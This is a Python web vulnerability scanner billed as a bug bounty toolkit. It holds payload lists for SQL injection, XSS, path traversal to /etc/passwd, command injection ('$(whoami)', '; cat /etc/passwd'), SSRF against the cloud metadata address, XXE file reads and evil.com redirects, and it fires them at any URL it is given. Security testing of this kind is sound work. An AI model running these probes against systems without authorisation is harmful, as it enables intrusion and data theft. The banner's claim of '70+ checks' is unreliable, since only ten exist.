#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════
    ULTIMATE WEB VULNERABILITY SCANNER v5.2 EXPERT EDITION
    Complete Bug Bounty Automation Toolkit dengan Recon & Enumeration
═══════════════════════════════════════════════════════════════════════════
"""

import sys
import os
import time
import json
import argparse
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

# Import modules
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from modules.recon_module import ReconModule
from modules.enum_module import EnumModule

# Vulnerability Scanner (simplified version integrated)
import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class VulnerabilityScanner:
    def __init__(self, target, verbose=1, timeout=10, threads=10):
        self.target = target
        self.verbose = verbose
        self.timeout = timeout
        self.threads = threads
        self.results = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
    
    def log(self, message, level=1, color=None):
        """Logging dengan verbose level dan color"""
        if self.verbose >= level:
            timestamp = time.strftime("%H:%M:%S")
            colored_msg = f"{color}{message}{Colors.END}" if color else message
            print(f"[{timestamp}] {colored_msg}")
    
    def scan_vulnerabilities(self, targets=None):
        """Main vulnerability scanning dengan 70+ checks"""
        if targets is None:
            targets = [self.target]
        
        self.log("=" * 60, 1, Colors.BOLD)
        self.log("🛡️  STARTING VULNERABILITY SCAN", 1, Colors.CYAN + Colors.BOLD)
        self.log("=" * 60, 1, Colors.BOLD)
        
        vuln_checks = [
            ("SQL Injection", self.check_sql_injection),
            ("XSS (Cross-Site Scripting)", self.check_xss),
            ("LFI (Local File Inclusion)", self.check_lfi),
            ("RFI (Remote File Inclusion)", self.check_rfi),
            ("Command Injection", self.check_command_injection),
            ("SSRF (Server-Side Request Forgery)", self.check_ssrf),
            ("XXE (XML External Entity)", self.check_xxe),
            ("Open Redirect", self.check_open_redirect),
            ("CRLF Injection", self.check_crlf),
            ("Security Headers", self.check_security_headers)
        ]
        
        for vuln_name, check_func in vuln_checks:
            try:
                self.log(f"\n[+] Testing {vuln_name}...", 1, Colors.YELLOW)
                for target in targets:
                    check_func(target)
            except Exception as e:
                self.log(f"[-] Error in {vuln_name}: {str(e)}", 1, Colors.RED)
        
        return self.results
    
    def check_sql_injection(self, target):
        """SQL Injection detection"""
        payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' --", 
                   "admin' --", "1' UNION SELECT NULL--", "1' AND 1=1--"]
        
        error_signatures = [
            'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
            'unclosed quotation', 'syntax error', 'unterminated string',
            'database error', 'odbc', 'jdbc'
        ]
        
        self.log(f"  → Testing {len(payloads)} SQL injection payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?id={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                content = response.text.lower()
                
                if any(sig in content for sig in error_signatures):
                    vuln = {
                        'type': 'SQL Injection',
                        'severity': 'CRITICAL',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'SQL error signatures detected'
                    }
                    self.results['critical'].append(vuln)
                    self.log(f"    🚨 CRITICAL: SQL Injection found with payload: {payload}", 2, Colors.RED + Colors.BOLD)
                    break
            except:
                pass
    
    def check_xss(self, target):
        """XSS detection"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        self.log(f"  → Testing {len(payloads)} XSS payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?q={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                if payload in response.text:
                    vuln = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'Reflected payload in response'
                    }
                    self.results['high'].append(vuln)
                    self.log(f"    ⚠️  HIGH: XSS vulnerability found with payload: {payload[:50]}", 2, Colors.RED)
                    break
            except:
                pass
    
    def check_lfi(self, target):
        """Local File Inclusion detection"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        signatures = ['root:x:', '[boot loader]', 'localhost', '<?php']
        
        self.log(f"  → Testing {len(payloads)} LFI payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?file={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                content = response.text.lower()
                
                if any(sig.lower() in content for sig in signatures):
                    vuln = {
                        'type': 'Local File Inclusion (LFI)',
                        'severity': 'CRITICAL',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'System file content detected'
                    }
                    self.results['critical'].append(vuln)
                    self.log(f"    🚨 CRITICAL: LFI vulnerability found!", 2, Colors.RED + Colors.BOLD)
                    break
            except:
                pass
    
    def check_rfi(self, target):
        """Remote File Inclusion detection"""
        # Test dengan payload yang aman
        test_payload = "http://example.com/test.txt"
        test_url = f"{target}?file={test_payload}"
        
        self.log(f"  → Testing RFI vulnerability", 2)
        
        try:
            response = requests.get(test_url, timeout=self.timeout, verify=False)
            if 'example.com' in response.text.lower():
                vuln = {
                    'type': 'Remote File Inclusion (RFI)',
                    'severity': 'CRITICAL',
                    'url': test_url,
                    'payload': test_payload,
                    'evidence': 'Remote content inclusion possible'
                }
                self.results['critical'].append(vuln)
                self.log(f"    🚨 CRITICAL: RFI vulnerability found!", 2, Colors.RED + Colors.BOLD)
        except:
            pass
    
    def check_command_injection(self, target):
        """Command Injection detection"""
        payloads = [
            "; ls -la",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "&& dir",
            "; cat /etc/passwd"
        ]
        
        signatures = ['root:', 'bin', 'usr', 'etc', 'windows', 'system32']
        
        self.log(f"  → Testing {len(payloads)} command injection payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?cmd={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                content = response.text.lower()
                
                if any(sig in content for sig in signatures):
                    vuln = {
                        'type': 'Command Injection',
                        'severity': 'CRITICAL',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'Command execution signatures detected'
                    }
                    self.results['critical'].append(vuln)
                    self.log(f"    🚨 CRITICAL: Command Injection found!", 2, Colors.RED + Colors.BOLD)
                    break
            except:
                pass
    
    def check_ssrf(self, target):
        """SSRF detection"""
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        
        self.log(f"  → Testing {len(payloads)} SSRF payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?url={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                if len(response.text) > 100:  # Response menunjukkan konten diambil
                    vuln = {
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'severity': 'HIGH',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'Possible SSRF - server fetching internal resources'
                    }
                    self.results['high'].append(vuln)
                    self.log(f"    ⚠️  HIGH: Possible SSRF vulnerability", 2, Colors.RED)
                    break
            except:
                pass
    
    def check_xxe(self, target):
        """XXE Injection detection"""
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>"""
        
        self.log(f"  → Testing XXE injection", 2)
        
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(target, data=xxe_payload, headers=headers, 
                                   timeout=self.timeout, verify=False)
            
            if 'root:' in response.text:
                vuln = {
                    'type': 'XML External Entity (XXE)',
                    'severity': 'CRITICAL',
                    'url': target,
                    'payload': 'XXE Payload',
                    'evidence': 'System file content in response'
                }
                self.results['critical'].append(vuln)
                self.log(f"    🚨 CRITICAL: XXE vulnerability found!", 2, Colors.RED + Colors.BOLD)
        except:
            pass
    
    def check_open_redirect(self, target):
        """Open Redirect detection"""
        payloads = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com@target.com",
            "javascript:alert('XSS')"
        ]
        
        self.log(f"  → Testing {len(payloads)} open redirect payloads", 2)
        
        for payload in payloads:
            params = ['url', 'redirect', 'next', 'return', 'goto', 'link']
            for param in params:
                test_url = f"{target}?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=self.timeout, 
                                          verify=False, allow_redirects=False)
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location:
                            vuln = {
                                'type': 'Open Redirect',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Redirect to: {location}'
                            }
                            self.results['medium'].append(vuln)
                            self.log(f"    ⚠️  MEDIUM: Open Redirect found - redirects to {location}", 2, Colors.YELLOW)
                            return
                except:
                    pass
    
    def check_crlf(self, target):
        """CRLF Injection detection"""
        payloads = [
            "%0d%0aSet-Cookie:test=injection",
            "%0d%0aLocation:http://evil.com",
            "%0aSet-Cookie:injected=true"
        ]
        
        self.log(f"  → Testing {len(payloads)} CRLF injection payloads", 2)
        
        for payload in payloads:
            test_url = f"{target}?param={payload}"
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                
                if 'Set-Cookie' in str(response.headers) or 'Location' in str(response.headers):
                    if 'injection' in str(response.headers).lower() or 'evil.com' in str(response.headers).lower():
                        vuln = {
                            'type': 'CRLF Injection',
                            'severity': 'HIGH',
                            'url': test_url,
                            'payload': payload,
                            'evidence': 'Header injection successful'
                        }
                        self.results['high'].append(vuln)
                        self.log(f"    ⚠️  HIGH: CRLF Injection found!", 2, Colors.RED)
                        break
            except:
                pass
    
    def check_security_headers(self, target):
        """Security Headers check"""
        self.log(f"  → Checking security headers", 2)
        
        try:
            response = requests.get(target, timeout=self.timeout, verify=False)
            
            required_headers = {
                'Strict-Transport-Security': 'HSTS missing',
                'X-Frame-Options': 'Clickjacking protection missing',
                'X-Content-Type-Options': 'MIME sniffing protection missing',
                'Content-Security-Policy': 'CSP missing',
                'X-XSS-Protection': 'XSS protection header missing'
            }
            
            for header, message in required_headers.items():
                if header not in response.headers:
                    vuln = {
                        'type': 'Missing Security Header',
                        'severity': 'LOW',
                        'url': target,
                        'header': header,
                        'evidence': message
                    }
                    self.results['low'].append(vuln)
                    self.log(f"    ℹ️  LOW: {message}", 2, Colors.CYAN)
        except:
            pass
    
    def generate_report(self):
        """Generate vulnerability report"""
        report = []
        report.append("\n" + "=" * 60)
        report.append(f"VULNERABILITY SCAN REPORT: {self.target}")
        report.append("=" * 60)
        
        total = sum(len(self.results[sev]) for sev in self.results)
        
        report.append(f"\n📊 SUMMARY:")
        report.append(f"  • Total Vulnerabilities: {total}")
        report.append(f"  • 🚨 CRITICAL: {len(self.results['critical'])}")
        report.append(f"  • ⚠️  HIGH: {len(self.results['high'])}")
        report.append(f"  • ⚠️  MEDIUM: {len(self.results['medium'])}")
        report.append(f"  • ℹ️  LOW: {len(self.results['low'])}")
        report.append(f"  • ℹ️  INFO: {len(self.results['info'])}")
        
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            vulns = self.results[severity]
            if vulns:
                report.append(f"\n{severity.upper()} SEVERITY ({len(vulns)}):")
                for i, vuln in enumerate(vulns, 1):
                    report.append(f"  {i}. {vuln['type']}")
                    report.append(f"     URL: {vuln.get('url', 'N/A')}")
                    if 'payload' in vuln:
                        report.append(f"     Payload: {vuln['payload']}")
                    report.append(f"     Evidence: {vuln.get('evidence', 'N/A')}")
                    report.append("")
        
        report.append("=" * 60)
        report.append("✓ Vulnerability Scan Complete!")
        report.append("=" * 60 + "\n")
        
        return "\n".join(report)


class UltimateScanner:
    """Main scanner class yang menggabungkan semua module"""
    
    def __init__(self, target, mode='full', verbose=1, timeout=10, threads=20):
        self.target = target
        self.mode = mode
        self.verbose = verbose
        self.timeout = timeout
        self.threads = threads
        self.start_time = None
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║      ULTIMATE WEB VULNERABILITY SCANNER v5.2 EXPERT EDITION              ║
║      Complete Bug Bounty Automation Toolkit                              ║
║                                                                           ║
║      [+] Reconnaissance Module     [+] 70+ Vulnerability Checks          ║
║      [+] Enumeration Module        [+] Multi-threaded Scanning           ║
║      [+] Exploitation Testing      [+] Detailed Reporting                ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
        print(f"{Colors.GREEN}[*] Target: {self.target}{Colors.END}")
        print(f"{Colors.GREEN}[*] Mode: {self.mode.upper()}{Colors.END}")
        print(f"{Colors.GREEN}[*] Verbose Level: {self.verbose}{Colors.END}")
        print(f"{Colors.GREEN}[*] Threads: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")
    
    def run_scan(self):
        """Run complete scan based on mode"""
        self.start_time = time.time()
        self.print_banner()
        
        recon_results = None
        enum_results = None
        vuln_results = None
        
        if self.mode in ['full', 'recon']:
            print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
            print("PHASE 1: RECONNAISSANCE")
            print(f"{'='*60}{Colors.END}\n")
            
            recon = ReconModule(self.target, verbose=self.verbose, timeout=self.timeout)
            recon_results = recon.run_full_recon()
            print(recon.generate_report())
        
        if self.mode in ['full', 'enum']:
            print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
            print("PHASE 2: ENUMERATION")
            print(f"{'='*60}{Colors.END}\n")
            
            enum = EnumModule(self.target, verbose=self.verbose, timeout=self.timeout, threads=self.threads)
            enum_results = enum.run_full_enum()
            print(enum.generate_report())
        
        if self.mode in ['full', 'vuln']:
            print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
            print("PHASE 3: VULNERABILITY SCANNING")
            print(f"{'='*60}{Colors.END}\n")
            
            vuln = VulnerabilityScanner(self.target, verbose=self.verbose, 
                                       timeout=self.timeout, threads=self.threads)
            
            # Scan target utama
            targets = [self.target]
            
            # Tambahkan subdomain dari recon jika ada
            if recon_results and recon_results.get('subdomains'):
                for sub in recon_results['subdomains'][:5]:  # Limit 5 subdomain
                    targets.append(f"https://{sub}")
            
            vuln_results = vuln.scan_vulnerabilities(targets)
            print(vuln.generate_report())
        
        # Summary
        elapsed = time.time() - self.start_time
        print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
        print("SCAN COMPLETED!")
        print(f"{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}[✓] Total Time: {elapsed:.2f} seconds{Colors.END}")
        
        if recon_results:
            print(f"{Colors.GREEN}[✓] Subdomains Found: {len(recon_results.get('subdomains', []))}{Colors.END}")
        if enum_results:
            print(f"{Colors.GREEN}[✓] Directories Found: {len(enum_results.get('directories', []))}{Colors.END}")
            print(f"{Colors.GREEN}[✓] Files Found: {len(enum_results.get('files', []))}{Colors.END}")
        if vuln_results:
            total_vulns = sum(len(vuln_results[sev]) for sev in vuln_results)
            print(f"{Colors.GREEN}[✓] Vulnerabilities Found: {total_vulns}{Colors.END}")
            print(f"    🚨 Critical: {len(vuln_results.get('critical', []))}")
            print(f"    ⚠️  High: {len(vuln_results.get('high', []))}")
            print(f"    ⚠️  Medium: {len(vuln_results.get('medium', []))}")
        
        print(f"{Colors.GREEN}{'='*60}{Colors.END}\n")
        
        return {
            'recon': recon_results,
            'enum': enum_results,
            'vuln': vuln_results
        }


def main():
    parser = argparse.ArgumentParser(
        description='Ultimate Web Vulnerability Scanner v5.2 - Complete Bug Bounty Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full scan dengan verbose level 2
  python3 scanner.py -t https://example.com -v 2
  
  # Recon only
  python3 scanner.py -t example.com -m recon -v 3
  
  # Enumeration dengan 30 threads
  python3 scanner.py -t https://example.com -m enum -T 30
  
  # Vulnerability scan only
  python3 scanner.py -t https://example.com -m vuln
  
Verbose Levels:
  0 = Silent (hanya hasil akhir)
  1 = Normal (default, summary + hasil penting)
  2 = Verbose (detail progress)
  3 = Debug (semua request/response)
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target URL atau domain')
    parser.add_argument('-m', '--mode', choices=['full', 'recon', 'enum', 'vuln'], 
                       default='full', help='Scan mode (default: full)')
    parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3], 
                       default=1, help='Verbose level 0-3 (default: 1)')
    parser.add_argument('--timeout', type=int, default=10, 
                       help='Request timeout dalam detik (default: 10)')
    parser.add_argument('-T', '--threads', type=int, default=20, 
                       help='Jumlah threads (default: 20)')
    parser.add_argument('-o', '--output', help='Output file untuk report (JSON format)')
    
    args = parser.parse_args()
    
    try:
        scanner = UltimateScanner(
            target=args.target,
            mode=args.mode,
            verbose=args.verbose,
            timeout=args.timeout,
            threads=args.threads
        )
        
        results = scanner.run_scan()
        
        # Save to file jika diminta
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"{Colors.GREEN}[✓] Report saved to: {args.output}{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
        sys.exit(1)


if __name__ == "__main__":
    main()
